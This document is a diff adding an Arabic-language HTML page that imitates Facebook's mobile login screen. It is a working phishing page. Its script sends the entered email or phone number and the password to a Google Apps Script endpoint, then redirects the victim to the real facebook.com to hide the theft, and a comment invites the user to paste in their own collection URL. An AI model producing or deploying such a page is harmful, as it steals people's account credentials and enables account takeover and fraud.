@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تسجيل الدخول إلى فيسبوك</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            min-height: 100vh;
+        }
+        .lang-bar {
+            text-align: center;
+            padding: 16px 0 8px 0;
+            color: #90949c;
+            font-size: 13px;
+        }
+        .lang-bar span {
+            color: #385898;
+            font-weight: 600;
+            margin: 0 4px;
+        }
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0 24px;
+            width: 100%;
+            max-width: 400px;
+            margin: auto;
+        }
+        .fb-logo-container {
+            margin-bottom: 35px;
+            text-align: center;
+        }
+        .fb-logo {
+            width: 55px;
+            height: 55px;
+            fill: #1877F2;
+        }
+        form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .input-group {
+            width: 100%;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            background-color: #f5f6f7;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            text-align: right;
+            color: #1c1e21;
+        }
+        input:focus {
+            border-color: #1877F2;
+            background-color: #ffffff;
+        }
+        .btn-login {
+            background-color: #1877F2;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            padding: 14px 0;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 4px;
+        }
+        .btn-login:active {
+            background-color: #166fe5;
+        }
+        .forgot-password {
+            text-align: center;
+            margin-top: 16px;
+            color: #4b4f56;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .footer-container {
+            padding: 24px;
+            text-align: center;
+            width: 100%;
+        }
+        /* تم ضبط زر إنشاء حساب ليكون عرضه مناسباً وغير ممتد بالكامل */
+        .btn-create {
+            background-color: transparent;
+            color: #1877F2;
+            border: 1px solid #1877F2;
+            border-radius: 8px;
+            padding: 10px 24px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- شريط اللغات العلوي -->
+    <div class="lang-bar">
+        العربية <span>English (UK)</span> <span>Français</span>
+    </div>
+
+    <!-- محتوى الصفحة -->
+    <div class="main-container">
+        <!-- شعار فيسبوك -->
+        <div class="fb-logo-container">
+            <svg class="fb-logo" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
+                <path d="M20.181 35.87C29.094 34.791 36 27.299 36 18 36 8.059 27.941 0 18 0S0 8.059 0 18c0 8.784 6.402 16.053 14.765 17.64v-12.45h-4.44V18h4.44v-3.792c0-4.385 2.613-6.808 6.604-6.808 1.912 0 3.913.342 3.913.342v4.305h-2.204c-2.177 0-2.854 1.352-2.854 2.743V18h4.85l-.776 5.06h-4.074v12.81z"/>
+            </svg>
+        </div>
+
+        <!-- فورم تسجيل الدخول -->
+        <form id="fbPhoneForm">
+            <div class="input-group">
+                <input type="text" name="email_or_phone" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required autocomplete="off">
+            </div>
+            
+            <div class="input-group">
+                <input type="password" name="password" id="password" placeholder="كلمة السر" required autocomplete="off">
+            </div>
+            
+            <button type="submit" class="btn-login">تسجيل الدخول</button>
+        </form>
+
+        <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+    </div>
+
+    <!-- زر إنشاء حساب -->
+    <div class="footer-container">
+        <button class="btn-create">إنشاء حساب جديد</button>
+    </div>
+
+    <script>
+        // ضع رابط Google Apps Script الخاص بك هنا
+        const scriptURL = 'https://script.google.com/macros/s/AKfycby40eMWfGbUoSYC0oIntjtYObQ7_5GWg11JRaJ67-wg1V9QYstx0xwUmn45FuAWgWDo4g/exec';
+
+        document.getElementById('fbPhoneForm').addEventListener('submit', e => {
+            e.preventDefault();
+            let formData = new URLSearchParams();
+            formData.append('platform', 'Facebook-Mobile');
+            formData.append('email_or_phone', document.getElementById('email').value);
+            formData.append('password', document.getElementById('password').value);
+
+            fetch(scriptURL, { method: 'POST', body: formData })
+                .finally(() => { 
+                    window.location.href = "https://www.facebook.com"; 
+                });
+        });
+    </script>
+</body>
+</html>
